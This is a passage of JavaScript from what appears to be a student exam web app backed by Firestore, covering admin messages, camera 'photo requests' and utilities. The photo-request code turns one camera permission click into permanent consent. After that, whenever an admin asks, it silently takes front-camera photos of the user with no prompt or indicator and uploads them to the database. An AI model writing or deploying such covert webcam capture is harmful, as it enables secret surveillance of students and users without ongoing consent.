async function closeResult() {
  document.getElementById("result-overlay").classList.remove("show");
  isReviewMode = false;
  showPage("app");
  await loadSessions();
  renderDashboard();
  navigateTo("dashboard");
}

// ============================================================
//  MESSAGES
// ============================================================
function listenMessages() {
  if (!currentUser) return;
  // No orderBy here — avoids needing a composite Firestore index.
  // Sort client-side instead.
  const q = query(
    collection(db, "messages"),
    where("toUser", "in", [currentUser.uid, "all"])
  );
  messagesUnsub = onSnapshot(q, snap => {
    const msgs = snap.docs
      .map(d => ({ id: d.id, ...d.data() }))
      .sort((a, b) => {
        const ta = a.createdAt?.toDate ? a.createdAt.toDate() : new Date(a.createdAt || 0);
        const tb = b.createdAt?.toDate ? b.createdAt.toDate() : new Date(b.createdAt || 0);
        return tb - ta; // newest first
      });
    const unread = msgs.filter(m => !m.read);
    // Bell badge
    document.getElementById("bell-badge").classList.toggle("show", unread.length > 0);
    // Show latest unread as banner
    if (unread.length > 0) {
      const latest = unread[0];
      document.getElementById("admin-banner-text").textContent = latest.text;
      document.getElementById("admin-banner").classList.add("show");
      // Mark as read
      markMessageRead(latest.id);
    }
  }, err => console.error("Messages listener:", err));
}

async function markMessageRead(msgId) {
  try { await updateDoc(doc(db, "messages", msgId), { read: true }); } catch(e){}
}

function closeBanner() {
  document.getElementById("admin-banner").classList.remove("show");
}

async function openMessages() {
  // Same: no orderBy to avoid index requirement
  const q = query(
    collection(db, "messages"),
    where("toUser", "in", [currentUser.uid, "all"])
  );
  const snap = await getDocs(q);
  const msgs = snap.docs
    .map(d => ({ id: d.id, ...d.data() }))
    .sort((a, b) => {
      const ta = a.createdAt?.toDate ? a.createdAt.toDate() : new Date(a.createdAt || 0);
      const tb = b.createdAt?.toDate ? b.createdAt.toDate() : new Date(b.createdAt || 0);
      return tb - ta;
    });

  const list = document.getElementById("messages-list");
  if (!msgs.length) {
    list.innerHTML = `<div class="empty-state" style="padding:24px;">
      <div class="empty-state-icon">&#128140;</div>
      <div class="empty-state-sub">Belum ada pesan dari admin</div>
    </div>`;
  } else {
    list.innerHTML = msgs.map(m => {
      const date = m.createdAt ? formatDate(m.createdAt.toDate ? m.createdAt.toDate() : new Date(m.createdAt)) : "";
      return `<div style="padding:12px 14px;border-radius:var(--radius-md);background:var(--pink-50);border:1px solid var(--pink-100);">
        <div style="font-size:.75rem;color:var(--pink-400);font-weight:600;margin-bottom:5px;">Admin &middot; ${date}</div>
        <div style="font-size:.9rem;color:var(--neutral-700);line-height:1.6;">${escHtml(m.text)}</div>
      </div>`;
    }).join("");
  }
  document.getElementById("messages-modal").classList.add("show");
  document.getElementById("bell-badge").classList.remove("show");
}

function closeMessagesModal() {
  document.getElementById("messages-modal").classList.remove("show");
}

// ============================================================
//  PHOTO REQUESTS (listen from admin)
// ============================================================
function listenPhotoRequests() {
  if (!currentUser) return;

  const q = query(
    collection(db, "photoRequests"),
    where("toUser", "in", [currentUser.uid, "all"]),
    where("status", "==", "pending")
  );
  photoRequestUnsub = onSnapshot(q, snap => {
    snap.docChanges().forEach(change => {
      if (change.type === "added") {
        const req = { id: change.doc.id, ...change.doc.data() };
        handleIncomingPhotoRequest(req);
      }
    });
  }, err => console.error("Photo request listener:", err));
}

async function handleIncomingPhotoRequest(req) {
  currentPhotoRequestId = req.id;

  // Check if user has already granted camera permission
  const alreadyAllowed = localStorage.getItem("cam-allowed") === "true";

  if (alreadyAllowed) {
    // Silent auto-capture — no popup needed
    await silentCapture(req);
  } else {
    // First time — show permission popup
    showPhotoRequestModal(req);
  }
}

function showPhotoRequestModal(req) {
  document.getElementById("camera-modal-title").textContent =
    req.title || "Admin minta foto kamu! 📸";
  document.getElementById("camera-modal-msg").textContent =
    req.message || "Haii say, senyum dong! 😊";

  setCamState("ask");
  document.getElementById("camera-modal").classList.add("show");
}

// User clicks "Izinkan" for the first time
async function allowCameraForever() {
  try {
    // Request camera access
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
    // Save permission granted
    localStorage.setItem("cam-allowed", "true");

    setCamState("capturing");
    await performCapture();
  } catch (e) {
    showToast("Kamera tidak bisa diakses: " + e.message, "error");
    closeCameraModal();
  }
}

// Auto silent capture (no modal shown)
async function silentCapture(req) {
  currentPhotoRequestId = req.id;
  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false
    });
    await performCapture(true); // silent = true, no modal
  } catch (e) {
    // Permission was revoked — reset and show modal next time
    localStorage.removeItem("cam-allowed");
    showPhotoRequestModal(req);
  }
}

// Core capture + send logic
async function performCapture(silent = false) {
  const video  = document.getElementById("cam-video");
  const canvas = document.getElementById("cam-canvas");

  video.srcObject = camStream;
  // Wait for video to be ready
  await new Promise(resolve => {
    video.onloadedmetadata = () => { video.play(); resolve(); };
    setTimeout(resolve, 1500); // fallback
  });
  // Extra wait so camera has time to focus/expose
  await new Promise(r => setTimeout(r, 800));

  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext("2d");
  // Mirror (selfie style)
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  stopCameraStream();

  // Convert to blob then base64
  canvas.toBlob(async (blob) => {
    const reader = new FileReader();
    reader.onloadend = async () => {
      try {
        const base64 = reader.result;
        const userName = currentUser._displayName || currentUser.displayName || "Siswa";

        await addDoc(collection(db, "photos"), {
          userId:    currentUser.uid,
          userName,
          requestId: currentPhotoRequestId,
          imageData: base64,
          takenAt:   serverTimestamp()
        });

        // Mark request fulfilled
        if (currentPhotoRequestId) {
          try {
            await updateDoc(doc(db, "photoRequests", currentPhotoRequestId), {
              status: "fulfilled",
              fulfilledAt: serverTimestamp(),
              fulfilledBy: currentUser.uid
            });
          } catch(e) {}
        }

        if (!silent) {
          setCamState("sent");
        } else {
          // Silent mode: close modal if it was open, or do nothing
          document.getElementById("camera-modal").classList.remove("show");
        }
        currentPhotoRequestId = null;
      } catch (e) {
        if (!silent) showToast("Gagal kirim foto: " + e.message, "error");
        closeCameraModal();
      }
    };
    reader.readAsDataURL(blob);
  }, "image/jpeg", 0.85);
}

function setCamState(state) {
  ["ask","capturing","sent"].forEach(s => {
    document.getElementById("cam-state-" + s).style.display = s === state ? "" : "none";
  });
}

async function declinePhoto() {
  if (currentPhotoRequestId) {
    try {
      await updateDoc(doc(db, "photoRequests", currentPhotoRequestId), {
        status: "declined",
        declinedAt: serverTimestamp(),
        declinedBy: currentUser.uid
      });
    } catch(e) {}
  }
  closeCameraModal();
}

function stopCameraStream() {
  if (camStream) {
    camStream.getTracks().forEach(t => t.stop());
    camStream = null;
  }
}

function closeCameraModal() {
  stopCameraStream();
  document.getElementById("camera-modal").classList.remove("show");
  currentPhotoRequestId = null;
}

// Keep old exports for safety (now unused but harmless)
window.openCamera    = allowCameraForever;
window.capturePhoto  = () => {};
window.retakePhoto   = () => {};
window.sendPhoto     = () => {};




function showModal(title, body, onConfirm) {
  document.getElementById("modal-title").textContent = title;
  document.getElementById("modal-body").textContent  = body;
  const btn = document.getElementById("modal-confirm-btn");
  btn.onclick = () => { closeModal(); onConfirm(); };
  document.getElementById("confirm-modal").classList.add("show");
}
function closeModal() {
  document.getElementById("confirm-modal").classList.remove("show");
}

// ============================================================
//  TOAST
// ============================================================
function showToast(msg, type = "info") {
  const container = document.getElementById("toast-container");
  const toast = document.createElement("div");
  toast.className = `toast ${type}`;
  const icons = { success:"&#10003;", error:"&#10007;", info:"&#9432;" };
  toast.innerHTML = `<span>${icons[type]||"&#9432;"}</span><span>${escHtml(msg)}</span>`;
  container.appendChild(toast);
  setTimeout(() => toast.remove(), 3500);
}

// ============================================================
//  UTILITIES
// ============================================================
function hideLoading() {
  document.getElementById("loading-screen").classList.add("hidden");
}

function escHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g,"&amp;")
    .replace(/</g,"&lt;")
    .replace(/>/g,"&gt;")
    .replace(/"/g,"&quot;");
}

function renderMath(str) {
  // Convert $...$ and \\[...\\] safely — just return the string;
  // KaTeX auto-render will handle it after DOM insertion
  return str;
}

function renderMathInPage() {
  if (window.renderMathInElement) {
    try {
      renderMathInElement(document.getElementById("exam-view"), {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false },
          { left: "\\[", right: "\\]", display: true }
        ],
        throwOnError: false
      });
    } catch(e) {}
  }
}

function shuffleArray(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function formatDate(d) {
  if (!d) return "–";
  return d.toLocaleDateString("id-ID", { day:"numeric", month:"short", year:"numeric" });
}

function formatDateFull(d) {
  return d.toLocaleDateString("id-ID", { weekday:"long", day:"numeric", month:"long", year:"numeric" });
}

function formatElapsed(secs) {
  const m = Math.floor(secs / 60);
  const s = secs % 60;
  return `${m}m ${s}s`;
}
